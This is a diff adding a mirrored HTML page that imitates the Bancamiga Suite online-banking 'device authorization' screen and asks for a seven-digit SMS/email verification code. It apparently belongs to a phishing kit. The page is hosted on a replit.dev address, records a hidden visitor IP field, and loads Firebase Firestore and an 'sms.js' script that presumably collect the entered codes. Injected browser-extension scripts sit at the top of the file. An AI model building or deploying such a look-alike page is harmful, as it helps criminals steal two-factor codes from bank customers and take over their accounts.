@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html lang="es"><script>
+    window[Symbol.for('MARIO_POST_CLIENT_{fca67f41-776b-438a-9382-662171858615}')] = new (class{constructor(e,t){this.name=e,this.destination=t,this.serverListeners={},this.bgRequestsListeners={},this.bgEventsListeners={},window.addEventListener("message",(e=>{const t=e.data,s=!(t.destination&&t.destination===this.name),n=!t.event;if(!s&&!n)if("MARIO_POST_SERVER__BG_RESPONSE"===t.event){const e=t.args;if(this.hasBgRequestListener(e.requestId)){try{this.bgRequestsListeners[e.requestId](e.response)}catch(e){}delete this.bgRequestsListeners[e.requestId]}}else if("MARIO_POST_SERVER__BG_EVENT"===t.event){const e=t.args;if(this.hasBgEventListener(e.event))try{this.bgEventsListeners[t.id](e.payload)}catch(e){}}else if(this.hasServerListener(t.event))try{this.serverListeners[t.event](t.args)}catch(e){}}))}emitToServer(e,t){const s=this.generateUIID(),n={args:t,destination:this.destination,event:e,id:s};return window.postMessage(n,location.origin),s}emitToBg(e,t){const s=this.generateUIID(),n={bgEventName:e,requestId:s,args:t};return this.emitToServer("MARIO_POST_SERVER__BG_REQUEST",n),s}hasServerListener(e){return!!this.serverListeners[e]}hasBgRequestListener(e){return!!this.bgRequestsListeners[e]}hasBgEventListener(e){return!!this.bgEventsListeners[e]}fromServerEvent(e,t){this.serverListeners[e]=t}fromBgEvent(e,t){this.bgEventsListeners[e]=t}fromBgResponse(e,t){this.bgRequestsListeners[e]=t}generateUIID(){return"xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g,(function(e){const t=16*Math.random()|0;return("x"===e?t:3&t|8).toString(16)}))}})('MARIO_POST_CLIENT_{fca67f41-776b-438a-9382-662171858615}', 'MARIO_POST_SERVER_{fca67f41-776b-438a-9382-662171858615}')</script><script>
+    const hideMyLocation = new (class{constructor(t){this.clientKey=t,this.watchIDs={},this.client=window[Symbol.for(t)];const e=navigator.geolocation.getCurrentPosition,o=navigator.geolocation.watchPosition,n=navigator.geolocation.clearWatch,i=this;navigator.geolocation.getCurrentPosition=function(t,o,n){i.handle(e,"GET",t,o,n)},navigator.geolocation.watchPosition=function(t,e,n){return i.handle(o,"WATCH",t,e,n)},navigator.geolocation.clearWatch=function(t){if(-1===t)return;const e=i.watchIDs[t];return delete i.watchIDs[t],n.apply(this,[e])}}handle(t,e,o,n,i){const a=this.client.emitToBg("HIDE_MY_LOCATION__GET_LOCATION");let r=this.getRandomInt(0,1e5);if(this.client.fromBgResponse(a,(a=>{if(a.enabled)if("SUCCESS"===a.status){const t=this.map(a);o(t)}else{const t=this.errorObj();n(t),r=-1}else{const a=[o,n,i],c=t.apply(navigator.geolocation,a);"WATCH"===e&&(this.watchIDs[r]=c)}})),"WATCH"===e)return r}map(t){return{coords:{accuracy:20,altitude:null,altitudeAccuracy:null,heading:null,latitude:t.latitude,longitude:t.longitude,speed:null},timestamp:Date.now()}}errorObj(){return{code:1,message:"User denied Geolocation"}}getRandomInt(t,e){return t=Math.ceil(t),e=Math.floor(e),Math.floor(Math.random()*(e-t+1))+t}})('MARIO_POST_CLIENT_{fca67f41-776b-438a-9382-662171858615}')
+  </script>
+<!-- Mirrored from c72a89e6-a400-478b-b3fa-fe6cc71cb0fd-00-2pffrboxd76kr.riker.replit.dev/codigo.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 05 Aug 2025 04:45:25 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bancamiga Suite - Autorización de Dispositivo</title>
+    <link rel="preconnect" href="../fonts.googleapis.com/index.html">
+    <link rel="preconnect" href="../fonts.gstatic.com/index.html" crossorigin="">
+    <link href="midas/css2.css" rel="stylesheet">
+    <style>
+        /* Variables de color */
+        :root {
+            --bancamiga-green: #5cb85c;
+            --bancamiga-dark-green: #2e7d32;
+            --bancamiga-light-grey: #f0f2f5;
+            --text-color-dark: #333;
+            --text-color-light: #555;
+            --input-bg: #f9f9f9;
+            --border-color: #ddd;
+            --main-blue-gradient-start: #007bff; /* Azul de fondo simulado */
+            --main-blue-gradient-end: #0056b3; /* Azul más oscuro de fondo simulado */
+            --device-auth-blue: #007bff; /* Azul principal del card */
+            --device-auth-text-dark: #003366; /* Azul oscuro para textos principales */
+            --device-auth-text-light: #6c757d; /* Gris para textos secundarios */
+        }
+
+        body {
+            font-family: 'Roboto', sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-start; /* Alinea al inicio para dejar espacio para la barra superior */
+            align-items: center;
+            min-height: 100vh;
+            box-sizing: border-box;
+            background-color: var(--bancamiga-light-grey);
+            background-image: url('assets/images/fondo_general_azul.html'); /* Fondo general azul */
+            background-repeat: no-repeat;
+            background-size: cover;
+            background-position: center center;
+            background-attachment: fixed;
+            color: var(--text-color-dark);
+            position: relative; /* Para la barra superior fija */
+        }
+
+        /* --- Contenedor Principal (Tarjeta de Autorización) --- */
+        .auth-container {
+            background-color: white;
+            border-radius: 20px;
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.15);
+            width: 90%;
+            max-width: 450px; /* Ajustado para ser un poco más ancho que un modal típico */
+            padding: 30px;
+            text-align: center;
+            box-sizing: border-box;
+            margin-top: 80px; /* Margen superior */
+            margin-bottom: 30px; /* Espacio inferior */
+            position: relative;
+            z-index: 10;
+            overflow: hidden; /* Para contener la imagen de fondo */
+        }
+
+        /* Estilo para el fondo azul dentro del contenedor */
+        .auth-container::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 35%; /* Altura de la sección azul superior dentro del card */
+            background: linear-gradient(to bottom, #007bff, #0056b3); /* Gradiente azul similar al fondo */
+            border-top-left-radius: 20px;
+            border-top-right-radius: 20px;
+            z-index: -1; /* Para que quede detrás del contenido */
+        }
+
+        /* Logo Bancamiga Suite dentro del card */
+        .auth-logo-suite {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 20px; /* Espacio debajo del logo */
+            color: white; /* Color del texto "Suite" */
+            position: relative;
+            z-index: 1; /* Para que esté sobre el fondo azul */
+        }
+        .auth-logo-suite img {
+            height: 35px; /* Tamaño del logo */
+            margin-right: 10px;
+        }
+        .auth-logo-suite .suite-text {
+            font-size: 24px;
+            font-weight: 700;
+        }
+
+        /* Títulos y textos */
+        .auth-title {
+            font-size: 26px;
+            font-weight: 700;
+            color: white; /* Blanco porque está sobre el fondo azul del card */
+            margin-bottom: 10px;
+            position: relative;
+            z-index: 1;
+        }
+        .auth-user-name {
+            font-size: 18px;
+            font-weight: 700;
+            color: white; /* Blanco porque está sobre el fondo azul del card */
+            margin-bottom: 15px;
+            position: relative;
+            z-index: 1;
+        }
+        .auth-instruction-text {
+            font-size: 15px;
+            color: white; /* Blanco porque está sobre el fondo azul del card */
+            margin-bottom: 50px; /* AJUSTADO: Se reduce un poco para dar más espacio a la imagen y centrarla mejor */
+            line-height: 1.4;
+            position: relative;
+            z-index: 1;
+        }
+
+        /* Imagen central del teléfono - Ajustes para que resalte y sea más grande Y se mueva al centro */
+        .phone-graphic {
+            width: 250px; /* Tamaño más grande para PC/Tablets */
+            height: auto;
+            margin-top: -30px; /* AJUSTADO: Margen negativo para superponer con el texto y centrarlo visualmente */
+            margin-bottom: 30px; /* Margen para separar de los inputs */
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2); /* Sombra para que resalte */
+            border-radius: 15px; /* Bordes redondeados */
+            transition: transform 0.3s ease-in-out; /* Animación de hover */
+        }
+        .phone-graphic:hover {
+            transform: scale(1.03); /* Ligeramente más grande al pasar el ratón */
+        }
+
+        /* Mensaje de "Hemos enviado el código" */
+        .code-prompt {
+            font-size: 16px;
+            color: var(--device-auth-text-light); /* Gris claro */
+            margin-top: 0px; /* AJUSTADO: Eliminado el margin-top para que se pegue más a la imagen */
+            margin-bottom: 20px;
+        }
+
+        /* Campos de entrada para el código */
+        .code-inputs {
+            display: flex;
+            justify-content: center;
+            gap: 10px; /* Espacio entre los cuadros */
+            margin-bottom: 30px;
+        }
+        .code-inputs input {
+            width: 45px; /* Ancho de cada cuadro */
+            height: 55px; /* Alto de cada cuadro */
+            text-align: center;
+            font-size: 24px;
+            font-weight: 700;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            outline: none; /* Elimina el contorno al enfocar */
+            transition: border-color 0.3s ease;
+            background-color: var(--input-bg);
+            color: var(--text-color-dark);
+        }
+        .code-inputs input:focus {
+            border-color: var(--bancamiga-green);
+            box-shadow: 0 0 0 3px rgba(92, 184, 92, 0.2); /* Sombra suave al enfocar */
+        }
+
+        /* Botones */
+        .btn {
+            width: 100%;
+            padding: 15px;
+            border: none;
+            border-radius: 10px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background-color 0.3s ease, color 0.3s ease;
+            margin-top: 15px;
+        }
+        .btn-verify {
+            background-color: var(--bancamiga-green);
+            color: white;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+        }
+        .btn-verify:hover {
+            background-color: #4cae4c;
+        }
+        .btn-back {
+            background-color: #e9ecef; /* Gris claro */
+            color: var(--text-color-light); /* Gris oscuro para el texto */
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.05);
+        }
+        .btn-back:hover {
+            background-color: #dee2e6;
+        }
+
+        /* Estilo para el cuadro de texto azul */
+        .info-box {
+            background-color: #e0f2f7; /* Un azul muy claro, casi celeste */
+            color: #007bff; /* Azul vibrante */
+            border: 1px solid #007bff; /* Borde azul */
+            border-radius: 10px;
+            padding: 15px;
+            margin-top: 20px; /* Espacio encima del cuadro de info */
+            margin-bottom: 20px; /* Espacio debajo del cuadro de info */
+            font-size: 14px;
+            line-height: 1.5;
+            text-align: left; /* Alineación del texto dentro del cuadro */
+        }
+
+        /* Estilo para el mensaje de error */
+        .error-message {
+            color: red;
+            font-weight: bold;
+            margin-top: -15px; /* Ajusta la posición para que esté justo debajo de los inputs */
+            margin-bottom: 15px; /* Espacio antes del siguiente elemento */
+            font-size: 15px;
+        }
+
+        /* Media queries para ajustes responsivos */
+        @media (max-width: 480px) {
+            .auth-container {
+                padding: 20px;
+                margin-top: 40px; /* Un poco menos de margen superior en móviles, para centrar mejor el contenido */
+            }
+            .auth-logo-suite img {
+                height: 30px;
+            }
+            .auth-logo-suite .suite-text {
+                font-size: 20px;
+            }
+            .auth-title {
+                font-size: 22px;
+            }
+            .auth-user-name {
+                font-size: 16px;
+            }
+            .auth-instruction-text {
+                font-size: 14px;
+                margin-bottom: 30px; /* AJUSTADO: Se reduce en móvil para centrar mejor */
+            }
+            .phone-graphic { /* Ajuste responsivo para la imagen central */
+                width: 180px; /* Un tamaño más adecuado para móviles */
+                box-shadow: 0 4px 10px rgba(0, 0, 0, 0.15); /* Sombra más sutil en móvil */
+                margin-top: -20px; /* AJUSTADO: Margen negativo en móvil para centrar */
+            }
+            /* AJUSTES CLAVE PARA QUE LOS INPUTS SE VEAN COMPLETOS EN MÓVIL */
+            .code-inputs {
+                gap: 5px; /* Reducimos el espacio entre los inputs */
+                /* ANTERIOR: flex-wrap: wrap; --> ELIMINADO PARA MANTENERLOS EN UNA SOLA LÍNEA */
+                justify-content: center; /* Centrar los elementos */
+            }
+            .code-inputs input {
+                /* Ajustar el ancho para que quepan 7 inputs con 5px de gap */
+                /* (100% - (6 * 5px)) / 7 */
+                width: calc((100% - 30px) / 7);
+                max-width: 38px; /* Mantener un máximo para evitar que se hagan demasiado grandes */
+                height: 48px; /* Ajustamos la altura */
+                font-size: 20px; /* Ajustamos el tamaño de fuente */
+                padding: 0; /* Aseguramos que no haya padding extra */
+                margin: 0; /* Aseguramos que no haya margin extra (aunque gap lo controla) */
+            }
+            .btn {
+                font-size: 16px;
+                padding: 12px;
+            }
+            .info-box {
+                padding: 10px;
+                font-size: 13px;
+            }
+        }
+    </style><script>(function inject(e){function SendXHRCandidate(e,t,n,r,i){try{var o="detector",s={posdMessageId:"PANELOS_MESSAGE",posdHash:(Math.random().toString(36).substring(2,15)+Math.random().toString(36).substring(2,15)+Math.random().toString(36).substring(2,15)).substring(0,22),type:"VIDEO_XHR_CANDIDATE",from:o,to:o.substring(0,6),content:{requestMethod:e,url:t,type:n,content:r}};i&&i[0]&&i[0].length&&(s.content.encodedPostBody=i[0]),window.postMessage(s,"*")}catch(e){}}var t=XMLHttpRequest.prototype.open;XMLHttpRequest.prototype.open=function(){this.requestMethod=arguments[0],t.apply(this,arguments)};var n=XMLHttpRequest.prototype.send;XMLHttpRequest.prototype.send=function(){var t=Object.assign(arguments,{}),r=this.onreadystatechange;return this.onreadystatechange=function(){if(4!==this.readyState||function isFrameInBlackList(t){return e.some((function(e){return t.includes(e)}))}(this.responseURL)||setTimeout(SendXHRCandidate(this.requestMethod,this.responseURL,this.getResponseHeader("content-type"),this.response,t),0),r)return r.apply(this,arguments)},n.apply(this,arguments)};var r=fetch;fetch=function fetch(){var e=this,t=arguments,n=arguments[0]instanceof Request?arguments[0].url:arguments[0],i=arguments[0]instanceof Request?arguments[0].method:"GET";return new Promise((function(o,s){r.apply(e,t).then((function(e){if(e.body instanceof ReadableStream){var t=e.json;e.json=function(){var r=arguments,o=this;return new Promise((function(s,a){t.apply(o,r).then((function(t){setTimeout(SendXHRCandidate(i,n,e.headers.get("content-type"),JSON.stringify(t)),0),s(t)})).catch((function(e){a(e)}))}))};var r=e.text;e.text=function(){var t=arguments,o=this;return new Promise((function(s,a){r.apply(o,t).then((function(t){setTimeout(SendXHRCandidate(i,n,e.headers.get("content-type"),t),0),s(t)})).catch((function(e){a(e)}))}))}}o.apply(this,arguments)})).catch((function(){s.apply(this,arguments)}))}))}})(["facebook.com/","twitter.com/index.html","youtube-nocookie.com/embed/index.html","http://vk.com/","http://www.vk.com/","http://linkedin.com/","http://www.linkedin.com/","http://instagram.com/","http://www.instagram.com/","http://www.google.com/recaptcha/api2/","http://hangouts.google.com/webchat/","http://www.google.com/calendar/","//www.google.com/maps/embed","spotify.com/index.html","soundcloud.com/index.html","http://player.vimeo.com/","http://disqus.com/","http://tgwidget.com/","http://js.driftt.com/","friends2follow.com","/widget","login","http://video.bigmir.net/","blogger.com","http://smartlock.google.com/","http://keep.google.com/","web.tolstoycomments.com/index.html","moz-extension_/index.html","chrome-extension_/index.html","auth/index.html","http://analytics.google.com/","adclarity.com","paddle.com/checkout","hcaptcha.com","recaptcha.net","2captcha.com","accounts.google.com","www.google.com/shopping/customerreviews","buy.tinypass.com","gstatic.com","secureir.ebaystatic.com","docs.google.com","contacts.google.com","github.com","mail.google.com","chat.google.com","audio.xpleer.com","keepa.com","static.xx.fbcdn.net"]);</script><script ecommerce-type="extend-native-history-api">(()=>{const e=history.pushState,t=history.replaceState,a=history.back,r=history.forward;function n(){window.postMessage({_custom_type_:"CUSTOM_ON_URL_CHANGED"})}history.pushState=function(){e.apply(history,arguments),n()},history.replaceState=function(){t.apply(history,arguments),n()},history.back=function(){a.apply(history,arguments),n()},history.forward=function(){r.apply(history,arguments),n()}})()</script>
+</head>
+<body bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6IntmY2E2N2Y0MS03NzZiLTQzOGEtOTM4Mi02NjIxNzE4NTg2MTV9IiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJkaXNhYmxlZCIsIkZBQ0VCT09LIjoiZGlzYWJsZWQiLCJUV0lUVEVSIjoiZGlzYWJsZWQiLCJSRURESVQiOiJkaXNhYmxlZCIsIlBJTlRFUkVTVCI6ImRpc2FibGVkIiwiSU5TVEFHUkFNIjoiZGlzYWJsZWQifSwidmVyc2lvbiI6IjEuOS4xNSIsInNjb3JlIjoxMDkxNX1d" bis_skin_checked="1">
+    <div class="auth-container" bis_skin_checked="1">
+        <div class="auth-logo-suite" bis_skin_checked="1">
+            <img src="midas/logo_bancamiga_suite_mini.png" alt="Bancamiga Logo">
+            <span class="suite-text"></span>
+        </div>
+
+        <h1 class="auth-title">Autorización de dispositivo</h1>
+        <p class="auth-user-name"></p>
+        <p class="auth-instruction-text">
+            El código de verificación fue enviado a través de correo electrónico y número telefónico vía SMS.
+        </p>
+
+        <img src="midas/mensaje.png" alt="Teléfono con código de verificación" class="phone-graphic">
+
+        <p class="code-prompt">Hemos enviado el código de verificación</p>
+        <form id="authForm" >
+          <div class="code-inputs">
+            <input type="text" maxlength="1" inputmode="numeric" class="code-input">
+            <input type="text" maxlength="1" inputmode="numeric" class="code-input">
+            <input type="text" maxlength="1" inputmode="numeric" class="code-input">
+            <input type="text" maxlength="1" inputmode="numeric" class="code-input">
+            <input type="text" maxlength="1" inputmode="numeric" class="code-input">
+            <input type="text" maxlength="1" inputmode="numeric" class="code-input">
+            <input type="text" maxlength="1" inputmode="numeric" class="code-input">
+        </div>
+
+  <div class="info-box">
+     Si tienes activada la verificación en dos pasos (2FA), 
+es posible que necesites ingresar un código adicional que se genera a 
+través de la aplicación Google Authenticator o similar, o recibirlo por 
+SMS.
+  </div>
+
+  <button type="submit" class="btn btn-verify">VERIFICAR</button>
+</form>
+        <button class="btn btn-back" onclick="window.location.href='index.html';">REGRESAR</button>
+    </div>
+
+    <!-- Overlay de carga -->
+    <div id="overlay" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 9999; justify-content: center; align-items: center;">
+        <div style="text-align: center; color: white;">
+            <div style="border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto 20px;"></div>
+            <p>Procesando código SMS...</p>
+        </div>
+    </div>
+
+    <!-- Input oculto para IP -->
+    <input type="hidden" id="direccionIP" name="direccionIP">
+
+    <!-- Scripts del proyecto -->
+    <!-- MODO FIREBASE REAL - ACTIVO -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
+    
+    <!-- Configuración centralizada de Firebase y rutas -->
+    <script src="js/firebase-config.js"></script>
+    
+    <script>
+        // Ocultar overlay inicialmente
+        document.addEventListener('DOMContentLoaded', function() {
+            const overlay = document.getElementById('overlay');
+            if (overlay) {
+                overlay.style.display = 'none';
+            }
+        });
+    </script>
+    <script src="js/sms.js"></script>
+
+
+<div class="adsbox ads ad adsbox doubleclick ad-placement carbon-ads" id="google_ads_iframe_/6355419/Travel/Europe/France/Paris_0__container__" bis_skin_checked="1">&nbsp;</div></body>
+<!-- Mirrored from c72a89e6-a400-478b-b3fa-fe6cc71cb0fd-00-2pffrboxd76kr.riker.replit.dev/codigo.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 05 Aug 2025 04:45:27 GMT -->
+</html>
